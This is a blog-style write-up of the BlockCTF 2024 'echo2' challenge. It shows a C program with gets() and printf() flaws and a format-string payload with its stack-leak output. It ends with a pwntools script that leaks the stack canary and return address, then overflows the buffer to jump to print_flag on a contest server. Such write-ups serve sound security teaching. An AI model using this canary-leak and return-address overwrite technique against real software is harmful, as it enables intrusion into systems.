+++
title = 'BlockCTF 2024 - pwn/echo2'
date = 2024-11-17T22:52:37-05:00
draft = false
+++

We are given a binary with all protectoins turned on and c source code.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

void print_flag() {
    uint8_t flag_buffer[256] = {0};
    int fd = open("flag.txt", O_RDONLY);
    read(fd, flag_buffer, sizeof(flag_buffer));
    puts(flag_buffer);
    close(fd);
}

void do_echo() {
    uint8_t echo_buffer[256] = {0};
    gets(echo_buffer);
    printf(echo_buffer);
    fflush(stdout);
}

int main(void) {
    while(1) {
        do_echo();
    }
    return 0;
}
```

There is a buffer overflow and printf vulnerability in do_echo(). We can set a breakpoint in do_echo() after printf and enter a format string to leak the canary and an address.

Sending our format string
```shell
%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx.%lx.%lx.%lx%lx.%lx
```
We leak out the stack
```shell
5555555592a1.0.7ffff7f8b8e055555555934b.0.2e786c252e786c25.252e786c25786c25.252e786c252e786c6c25786c252e786c.6c252e786c252e78.6c252e786c252e78.786c252e786c2578.786c252e786c252e2e786c25786c252e.2e786c252e786c25.25786c252e786c25.252e786c252e786c.252e786c252e786c6c252e786c25786c.6c252e786c252e78.786c25786c252e78.786c252e786c252e.786c252e786c252e2e786c252e786c25.2e786c252e786c25.252e786c25786c25.786c.00.0.0.0.00.0.0.0.07befa8536e8aba00.7fffffffe338.5555555555b5.5555555555a1.7ffff7dc9e087fffffffe260.7fffffffe338
```

`07befa8536e8aba00` at offset 39 looks like our canary and at offset 41 is the saved RIP. In gdb with the gef extenstoin, we can use the command 'canary' to print out the canary and confirm that we have the right one. Similarly we can use 'info frame' to see that we have the right RIP.

The saved RIP address is main+20. We can calculate the offset between this andress and the start of the print_flag fucntion, which is 908. Putting it all together:

```python
from pwn import *

target = remote("54.85.45.101", 8009)

# leak canary
payload = "%39$lx"
target.sendline(payload)
canary = int(target.recv(16),16)
log.info(hex(canary))

# leak RIP
payload = "%41$lx"
target.sendline(payload)
rip = int(target.recv(12),16)
log.info(hex(rip))

# offset from leak to print_flag = 908
payload = b"A" * 264 + p64(canary) + p64(0xdeadbeef) + p64(rip - 908)
target.sendline(payload)
target.interactive()
```

flag{aslr_and_canari3s_are_n0_match_f0r_l3aky_stacks}